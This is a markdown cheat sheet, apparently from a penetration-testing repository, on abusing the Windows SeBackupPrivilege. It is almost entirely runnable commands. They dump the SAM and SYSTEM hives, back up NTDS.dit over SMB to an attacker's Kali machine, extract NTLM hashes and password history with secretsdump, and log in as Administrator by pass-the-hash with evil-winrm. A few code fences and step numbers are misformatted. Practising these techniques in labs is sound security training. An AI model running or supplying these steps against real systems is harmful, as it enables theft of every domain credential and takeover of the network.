[Refrence](https://2018.romhack.io/slides/RomHack%202018%20-%20Andrea%20Pierini%20-%20whoami%20priv%20-%20show%20me%20your%20Windows%20privileges%20and%20I%20will%20lead%20you%20to%20SYSTEM.pdf)
# SeBackupPrivilege 
## Overview
The `SeBackupPrivilege` allows users to bypass file and directory permissions to back up the system, including sensitive files like the Security Account Manager (SAM) and Active Directory database (NTDS.dit). Exploiting this privilege enables:

- Extracting NTLM hashes for offline cracking or Pass-the-Hash (PTH) attacks.
- Circumventing NTFS file and directory permissions through the backup application interface.

---

## Method 1: Backup Windows Registry and Extract Local NTLM Hashes

### Tools Used
- **Diskshadow**: Creates copies of active drives.
- **Robocopy**: Copies files and directories.
- **Impacket-secretsdump**: Extracts NTLM hashes.
- **Evil-WinRM**: Used for PTH attacks.

### Steps

1. **Create a temporary directory:**
   ```
   mkdir C:\temp
   ```

2. **Copy the SAM and SYSTEM hives to the temporary directory:**
   ```
   reg save hklm\sam C:\temp\sam.hive
   reg save hklm\system C:\temp\system.hive
   ```

3. **Extract NTLM hashes using Impacket's secretsdump:**
   ```
   impacket-secretsdump -sam sam.hive -system system.hive LOCAL
   ```

4. **Perform a PTH attack using Evil-WinRM:**
   ```
   evil-winrm -i <ip> -u "Administrator" -H "<hash>"
   ```

5. **Optional:** Copy specific files bypassing permissions:
   ```
   robocopy /b c:\users\administrator\desktop\ c:\temp
   ```

---

## Method 2: Extract Active Directory NTDS.dit

### Tools Used
- **wbadmin**: Used for backups.
- **Evil-WinRM**: For downloading extracted files.
- **Linux SMB Server**: For file transfer from Windows to Linux.

### Steps

1. **Prepare an NTFS disk on Kali Linux:**
   - Ensure the disk is formatted with NTFS to store files from the backup. -> [CheckMe](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/Support/Create%20NTFS%20Disk%20on%20kali-linux.md)

2. **Set up an SMB server on Kali Linux:**
   - Use `smbserver` to create a shared directory accessible from Windows. -> [CheckMe](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/Support/File%20Transfer.md)

3. **Initiate a backup of the NTDS folder using wbadmin:**
   ```powershell
   echo y | wbadmin start backup -backuptarget:\\<linux_ip>\public -include:c:\windows\ntds\
   ```
   - Note: This process can take considerable time.
   - Once it finished you will found the following
     ![Pasted image 20250429230647](https://github.com/user-attachments/assets/00ebb440-bd41-4652-ae4b-1159894e6a99)

4. **Verify backup versions:**
   ```powershell
   wbadmin get versions
   ```
  ![Pasted image 20250429230758](https://github.com/user-attachments/assets/ad3d7839-0e36-4120-968b-343e931fea15)

5. **Recover the NTDS.dit file:**
   ```
   echo Y | wbadmin start recovery -version:<backup_version> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\temp -notrestoreacl
   ```powershell
   example
   ```powershell
   echo Y | wbadmin start recovery -version:04/30/2025-02:34 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\temp -notrestoreacl
   ```
  ![Pasted image 20250429231914](https://github.com/user-attachments/assets/1f9173d8-c786-4034-aa38-eedee5641246)

7. **Download the NTDS.dit file using Evil-WinRM:**
   ```powershell
   download ntds.dit
   ```
8. **Create system.hive file adn download it**
   ``` powershell
   reg save hklm\system C:\temp\system.hive
   ```
9. **Extract secrets**
  ``` shell
  secretsdump.py -ntds <ntds.dit> -system <system.hive> Local
  ```
  ![image](https://github.com/user-attachments/assets/392c3522-088f-48e4-bc93-dc094512d7d0)

  with history to get changed credentials:
  ``` shell
  secretsdump.py -ntds <ntds.dit> -system <system.hive> -history Local
  ```
  ![image](https://github.com/user-attachments/assets/e578c8bf-73ea-4411-b89f-f1570dbec664)

10. **Check The Hash**
    ``` shell
    netexec smb $IP -u <'Administrator'> -H <'Hash'> "whoami"
    ```
12.  **Perform a PTH attack using Evil-WinRM:**
   ```
   evil-winrm -i <ip> -u "Administrator" -H "<hash>"
   ```
